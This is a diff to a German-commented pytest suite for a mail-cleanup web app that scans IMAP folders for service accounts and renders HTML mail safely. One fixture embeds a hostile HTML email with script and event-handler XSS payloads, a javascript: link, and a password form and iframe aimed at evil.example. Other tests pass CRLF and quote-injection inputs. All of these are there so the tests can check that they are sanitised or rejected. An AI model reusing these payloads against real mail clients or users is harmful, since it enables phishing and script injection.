@@ -40,6 +40,22 @@ def raw_imap() -> imaplib.IMAP4_SSL:
     return c
 
 
+def html_msg(sender: str, subject: str, days_ago: int) -> bytes:
+    date = format_datetime(datetime.now(timezone.utc) - timedelta(days=days_ago))
+    html = ('<html><head><script>alert(1)</script><style>body{color:red}</style></head><body>'
+            '<h1 onclick="steal()">Willkommen bei Netflix</h1><p>Hallo &amp; danke.</p>'
+            '<img src="https://tracker.example/pixel.gif" onerror="alert(2)">'
+            '<a href="javascript:alert(3)">Klick</a> <a href="https://help.netflix.com/">Hilfe</a>'
+            '<form action="https://evil.example"><input name="pw"></form><iframe src="https://evil.example"></iframe>'
+            '</body></html>')
+    return (f"From: Netflix <info@mailer.netflix.com>\r\nTo: {USER}\r\nSubject: {subject}\r\nDate: {date}\r\n"
+            "List-Unsubscribe: <https://www.netflix.com/unsubscribe?x=1>, <mailto:unsub@netflix.com>\r\n"
+            f"Message-ID: <{time.time_ns()}@test>\r\nMIME-Version: 1.0\r\n"
+            "Content-Type: multipart/alternative; boundary=b1\r\n\r\n"
+            "--b1\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nWillkommen bei Netflix. Hallo & danke.\r\n"
+            "--b1\r\nContent-Type: text/html; charset=utf-8\r\n\r\n" + html + "\r\n--b1--\r\n").encode()
+
+
 def msg(sender: str, subject: str, days_ago: int, unsub: bool = False) -> bytes:
     date = format_datetime(datetime.now(timezone.utc) - timedelta(days=days_ago))
     extra = "List-Unsubscribe: <mailto:unsubscribe@example.com>\r\n" if unsub else ""
@@ -60,6 +76,15 @@ SEED_INBOX = [
 ]
 SEED_ARCHIVE = [
     ("Adobe <mail@mail.adobe.com>", "Ihre Adobe ID wurde erstellt", 2500),
+]
+INBOX_TOTAL = len(SEED_INBOX) + 1  # + eine HTML-Mail (Netflix)
+# Registrierungs-Mails landen oft im Spam – auch dort wird gesucht
+SEED_JUNK = [
+    ("Cloudflare <noreply@notify.cloudflare.com>", "[Cloudflare]: Please verify your email address", 900),
+    ("Discord <noreply@discord.com>", "Verify Email Address for Discord", 1200),
+    ("Discord <noreply@discord.com>", "Your Discord account is scheduled for deletion", 3),
+    ("Canva <no-reply@canva.com>", "Welcome to Canva", 1000),
+    ("Canva <no-reply@canva.com>", "Your email address has been changed", 2),
 ]
 
 
@@ -82,6 +107,9 @@ def mailbox():
         c.append("INBOX", None, None, msg(sender, subject, days, bool(unsub and unsub[0])))
     for sender, subject, days in SEED_ARCHIVE:
         c.append('"Archiv"', None, None, msg(sender, subject, days))
+    for sender, subject, days in SEED_JUNK:
+        c.append("Junk", None, None, msg(sender, subject, days))
+    c.append("INBOX", None, None, html_msg("Netflix", "Willkommen bei Netflix", 50))
     c.logout()
     yield
 
@@ -142,15 +170,14 @@ def test_scan_detects_and_merges_services(auth, account):
     assert r.status_code == 202
     job = auth.get(f"/api/scans/{r.json()['id']}").json()
     assert job["status"] == "done", job
-    assert job["messages_seen"] == len(SEED_INBOX) + len(SEED_ARCHIVE)
+    assert job["messages_seen"] == INBOX_TOTAL + len(SEED_ARCHIVE) + len(SEED_JUNK)
 
     services = {s["name"]: s for s in auth.get("/api/services").json()}
     assert {"GitHub", "Spotify", "Dropbox", "Adobe"} <= services.keys()
     # Persönliche Freemail-Absender und reine Newsletter sind keine Dienste
     assert not any("gmail" in d for s in services.values() for d in s["domains"])
-    # Jede Mail zählt: auch reine Newsletter-Absender erscheinen – aber nur als "mögliches" Konto
-    kultur = next(s for s in services.values() if "kulturverein-beispiel.at" in s["domains"])
-    assert kultur["quality"] == "niedrig" and kultur["jdm"] is None
+    # Nur sichere Konten: ein reiner Newsletter-Absender ist kein Konto
+    assert not any("kulturverein-beispiel.at" in s["domains"] for s in services.values())
 
     gh = services["GitHub"]
     assert gh["jdm"] and gh["jdm"]["url"].startswith("https://")
@@ -173,11 +200,11 @@ def test_scan_detects_and_merges_services(auth, account):
 
 def test_folders_and_message_listing(auth, account):
     folders = {f["id"]: f for f in auth.get(f"/api/mail/{account['id']}/folders").json()}
-    assert folders["INBOX"]["count"] == len(SEED_INBOX) and folders["INBOX"]["special"] == "inbox"
+    assert folders["INBOX"]["count"] == INBOX_TOTAL and folders["INBOX"]["special"] == "inbox"
     assert folders["Trash"]["special"] == "trash" and folders["Archiv"]["count"] == 1
 
     r = auth.get(f"/api/mail/{account['id']}/messages", params={"folder": "INBOX", "page_size": 10}).json()
-    assert r["total"] == len(SEED_INBOX) and r["uidvalidity"]
+    assert r["total"] == INBOX_TOTAL and r["uidvalidity"]
     subjects = [m["subject"] for m in r["items"]]
     assert "Welcome to GitHub!" in subjects
 
@@ -206,7 +233,7 @@ def test_delete_single_moves_to_trash_and_verifies(auth, account):
     assert r.status_code == 200, r.text
     res = r.json()
     assert res == {**res, "requested": 1, "deleted": 1, "failed": 0, "verified": True, "moved_to_trash": True}
-    assert count("INBOX") == len(SEED_INBOX) - 1 and count("Trash") == 1
+    assert count("INBOX") == INBOX_TOTAL - 1 and count("Trash") == 1
 
 
 def test_bulk_delete_requires_confirmation(auth, account):
@@ -217,7 +244,7 @@ def test_bulk_delete_requires_confirmation(auth, account):
     r = auth.post(f"/api/mail/{account['id']}/delete", json={"folder": "INBOX", "mode": "selected", "ids": ids,
                                                              "confirmation": "löschen"})
     assert r.status_code == 200 and r.json()["deleted"] == 2
-    assert count("INBOX") == len(SEED_INBOX) - 2
+    assert count("INBOX") == INBOX_TOTAL - 2
 
 
 def test_permanent_delete_requires_confirmation_even_for_one(auth, account):
@@ -231,7 +258,7 @@ def test_delete_all_checks_expected_count(auth, account):
     r = auth.post(f"/api/mail/{account['id']}/delete", json={
         "folder": "INBOX", "mode": "all", "expected_count": 3, "confirmation": "LÖSCHEN"})
     assert r.status_code == 409
-    assert count("INBOX") == len(SEED_INBOX)  # nichts gelöscht
+    assert count("INBOX") == INBOX_TOTAL  # nichts gelöscht
 
 
 def test_delete_all_in_folder_permanently(auth, account):
@@ -282,14 +309,14 @@ def test_folder_injection_rejected(auth, account, folder):
     r = auth.post(f"/api/mail/{account['id']}/delete", json={"folder": folder, "mode": "all", "expected_count": 0,
                                                              "confirmation": "LÖSCHEN"})
     assert r.status_code in (400, 502)
-    assert count("INBOX") == len(SEED_INBOX)
+    assert count("INBOX") == INBOX_TOTAL
 
 
 @pytest.mark.parametrize("bad", ["1:*", "1,2", "-1", "abc", "0"])
 def test_invalid_uids_rejected(auth, account, bad):
     r = auth.post(f"/api/mail/{account['id']}/delete", json={"folder": "INBOX", "mode": "selected", "ids": [bad]})
     assert r.status_code == 400
-    assert count("INBOX") == len(SEED_INBOX)
+    assert count("INBOX") == INBOX_TOTAL
 
 
 def test_reading_does_not_mark_as_seen(auth, account):
@@ -313,3 +340,99 @@ def test_removing_account_updates_service_counts(auth, account):
     auth.post("/api/scans", json={"account_id": again["id"]})
     gh = next(s for s in auth.get("/api/services").json() if s["name"] == "GitHub")
     assert gh["message_count"] == 3 and gh["sender_count"] == 2
+
+
+# ---------------------------------------------------------------- Neue Erkennung, Gedächtnis, Lesen
+
+def test_scan_finds_spam_folder_deletion_requests_and_email_changes(auth, account):
+    auth.post("/api/scans", json={"account_id": account["id"]})
+    services = {s["name"]: s for s in auth.get("/api/services").json()}
+    assert {"Cloudflare", "Discord", "Canva", "Netflix"} <= services.keys()
+    assert services["Cloudflare"]["jdm"] is not None
+    # Discord kündigt die Löschung an → angefragt, noch nicht gelöscht
+    assert services["Discord"]["status"] == "angefragt" and not services["Discord"]["deletion_detected"]
+    assert services["Discord"]["lifecycle"] in ("waiting", "likely_deleted")
+    # Canva: Adresse weg von diesem Postfach geändert → gilt als gelöscht
+    assert services["Canva"]["deletion_detected"] and services["Canva"]["status"] == "geloescht"
+    assert services["Canva"]["deletion_kind"] == "email_changed"
+    assert services["Dropbox"]["deletion_kind"] == "deleted"
+
+
+def test_memory_keeps_accounts_after_mails_are_deleted(auth, account):
+    auth.post("/api/scans", json={"account_id": account["id"]})
+    gh = next(s for s in auth.get("/api/services").json() if s["name"] == "GitHub")
+    c = raw_imap()
+    c.select("INBOX")
+    _, data = c.search(None, "FROM", "github.com")
+    c.store(b",".join(data[0].split()).decode(), "+FLAGS.SILENT", r"(\Deleted)")
+    c.expunge()
+    c.logout()
+    auth.post("/api/scans", json={"account_id": account["id"]})
+    again = next(s for s in auth.get("/api/services").json() if s["name"] == "GitHub")
+    assert again["id"] == gh["id"] and again["memory_only"] is True
+    assert again["confidence"] >= 0.85  # das Gedächtnis hält die Erkennung
+
+
+def test_service_mails_lists_recognized_mails(auth, account):
+    auth.post("/api/scans", json={"account_id": account["id"]})
+    gh = next(s for s in auth.get("/api/services").json() if s["name"] == "GitHub")
+    r = auth.get(f"/api/services/{gh['id']}/mails").json()
+    subjects = {i["subject"] for i in r["items"]}
+    assert "Welcome to GitHub!" in subjects and all(i["msg_ref"].isdigit() for i in r["items"])
+    assert all(i["account_id"] == account["id"] and i["folder"] == "INBOX" for i in r["items"])
+    assert r["explanation"] and r["explanation"][0]["label"]
+    assert auth.get("/api/services/999999/mails").status_code == 404
+
+
+def _uid_of(auth, account, subject, folder="INBOX"):
+    items = auth.get(f"/api/mail/{account['id']}/messages", params={"folder": folder, "page_size": 100}).json()["items"]
+    return next(i["id"] for i in items if i["subject"] == subject)
+
+
+def test_read_message_text_and_sanitized_html(auth, account):
+    uid = _uid_of(auth, account, "Willkommen bei Netflix")
+    m = auth.get(f"/api/mail/{account['id']}/message", params={"folder": "INBOX", "uid": uid})
+    assert m.status_code == 200
+    body = m.json()
+    assert "Willkommen bei Netflix" in body["text"] and body["has_html"] and body["seen"] is False
+    assert body["unsubscribe"] == {"https": "https://www.netflix.com/unsubscribe?x=1", "mailto": "mailto:unsub@netflix.com"}
+    assert "_html" not in body
+
+    h = auth.get(f"/api/mail/{account['id']}/message/html", params={"folder": "INBOX", "uid": uid})
+    assert h.status_code == 200 and h.headers["content-type"].startswith("text/html")
+    html = h.text.lower()
+    for bad in ("<script", "alert(", "onclick", "onerror", "javascript:", "<form", "<iframe", "<input"):
+        assert bad not in html, bad
+    assert 'href="https://help.netflix.com/"' in h.text and 'rel="noopener noreferrer nofollow"' in h.text
+    csp = h.headers["content-security-policy"]
+    assert "sandbox" in csp and "script-src" not in csp and "img-src data:;" in csp
+    assert h.headers["x-frame-options"] == "SAMEORIGIN"
+    with_images = auth.get(f"/api/mail/{account['id']}/message/html", params={"folder": "INBOX", "uid": uid, "images": "true"})
+    assert "img-src data: https:" in with_images.headers["content-security-policy"]
+    # Lesen setzt kein \Seen
+    c = raw_imap()
+    c.select("INBOX", readonly=True)
+    _, data = c.search(None, "SEEN")
+    c.logout()
+    assert data[0] == b""
+
+
+def test_mark_read_unread_and_move(auth, account):
+    uid = _uid_of(auth, account, "Weekly digest")
+    r = auth.post(f"/api/mail/{account['id']}/flags", json={"folder": "INBOX", "ids": [uid], "seen": True})
+    assert r.status_code == 200
+    items = auth.get(f"/api/mail/{account['id']}/messages", params={"folder": "INBOX", "page_size": 100}).json()["items"]
+    assert next(i for i in items if i["id"] == uid)["seen"] is True
+    r = auth.post(f"/api/mail/{account['id']}/move", json={"folder": "INBOX", "ids": [uid], "target": "Archiv"})
+    assert r.status_code == 200 and r.json()["moved"] == 1
+    assert count("INBOX") == INBOX_TOTAL - 1 and count("Archiv") == 2
+    bad = auth.post(f"/api/mail/{account['id']}/move", json={"folder": "INBOX", "ids": ["1"], "target": "Gibt\"Es Nicht"})
+    assert bad.status_code in (400, 502)
+
+
+def test_server_side_search(auth, account):
+    r = auth.get(f"/api/mail/{account['id']}/messages", params={"folder": "INBOX", "q": "Dropbox"}).json()
+    assert r["total"] == 2 and all("Dropbox" in i["from_name"] for i in r["items"])
+    umlaut = auth.get(f"/api/mail/{account['id']}/messages", params={"folder": "INBOX", "q": "Bäckerei"}).json()
+    assert umlaut["total"] == 1
+    assert auth.get(f"/api/mail/{account['id']}/messages", params={"folder": "INBOX", "q": "a\r\nX"}).status_code == 400
